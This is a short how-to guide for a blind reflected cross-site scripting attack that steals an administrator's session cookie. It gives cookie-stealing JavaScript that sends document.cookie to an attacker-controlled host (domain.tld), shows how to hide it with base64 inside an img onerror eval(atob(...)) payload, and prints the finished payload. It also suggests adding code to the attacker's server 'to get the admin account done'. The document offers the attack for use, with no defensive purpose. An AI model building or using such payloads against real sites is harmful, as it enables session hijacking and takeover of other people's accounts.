#You can perform blind reflective xss without logging into the application and even be able to get the cookie from the admin account
![xss](/xss.jpg)
#How to Create your Payload:
1. convert "var a=document.createElement("script");a.src=" http://domain.tld/a.js?"+document.cookie;document.body.appendChild(a);" into base 64 data example 
  dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9IiBodHRwOi8vZG9tYWluLnRsZC9hLmpzPyIrZG9jdW1lbnQuY29va2llO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk77

2. add your base 64 data in pace of data in the payload "<img Src=x Onerror=eval(atob(this.id)) Id="data">"

3. create a listner on your server with a file a.js that does nothing or you could add something you wish to get the admin account done.. up to you!

The final payload will look like:
<img Src=x Onerror=eval(atob(this.id)) Id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9IiBodHRwOi8vZG9tYWluLnRsZC9hLmpzPyIrZG9jdW1lbnQuY29va2llO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk77">
